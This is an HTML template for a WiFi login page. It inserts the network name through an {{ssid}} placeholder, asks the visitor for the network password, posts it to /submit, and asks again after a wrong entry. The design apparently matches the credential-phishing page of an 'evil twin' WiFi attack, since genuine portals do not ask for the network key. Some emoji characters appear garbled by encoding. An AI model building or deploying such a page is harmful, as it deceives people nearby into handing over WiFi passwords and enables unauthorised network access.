<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {{ssid}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 100%;
            padding: 40px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo svg {
            width: 60px;
            height: 60px;
            fill: #667eea;
        }

        h1 {
            text-align: center;
            color: #2d3748;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            color: #718096;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .network-info {
            background: #f7fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
        }

        .network-name {
            font-weight: 600;
            color: #2d3748;
            font-size: 16px;
            display: flex;
            align-items: center;
        }

        .network-name::before {
            content: 'ðŸ“¶';
            margin-right: 10px;
            font-size: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #4a5568;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .error {
            background: #fed7d7;
            border: 1px solid #fc8181;
            color: #c53030;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .error.show {
            display: block;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            display: none;
        }

        button:disabled .spinner {
            display: inline-block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            margin-top: 25px;
            color: #a0aec0;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
        </div>

        <h1>WiFi Authentication</h1>
        <p class="subtitle">Enter your password to connect</p>

        <div class="network-info">
            <div class="network-name">{{ssid}}</div>
        </div>

        <div class="error" id="error"></div>

        <form id="loginForm" method="POST" action="/submit">
            <div class="form-group">
                <label for="password">Network Password</label>
                <input
                    type="password"
                    id="password"
                    name="password"
                    required
                    autocomplete="off"
                    placeholder="Enter password"
                >
            </div>

            <button type="submit" id="submitBtn">
                <span class="spinner"></span>
                <span class="btn-text">Connect</span>
            </button>
        </form>

        <div class="footer">
            Secure WiFi Connection
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const errorDiv = document.getElementById('error');
        const btnText = document.querySelector('.btn-text');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            submitBtn.disabled = true;
            btnText.textContent = 'Connecting...';
            errorDiv.classList.remove('show');

            const formData = new FormData(form);

            fetch('/submit', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    btnText.textContent = 'Connected!';
                    errorDiv.textContent = 'âœ“ Connection successful!';
                    errorDiv.style.background = '#c6f6d5';
                    errorDiv.style.border = '1px solid #9ae6b4';
                    errorDiv.style.color = '#22543d';
                    errorDiv.classList.add('show');

                    setTimeout(() => {
                        window.location.href = '/success';
                    }, 1500);
                } else {
                    throw new Error(data.message || 'Invalid password');
                }
            })
            .catch(error => {
                submitBtn.disabled = false;
                btnText.textContent = 'Connect';
                errorDiv.textContent = 'âœ— Invalid password. Please try again.';
                errorDiv.classList.add('show');
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            });
        });
    </script>
</body>
</html>
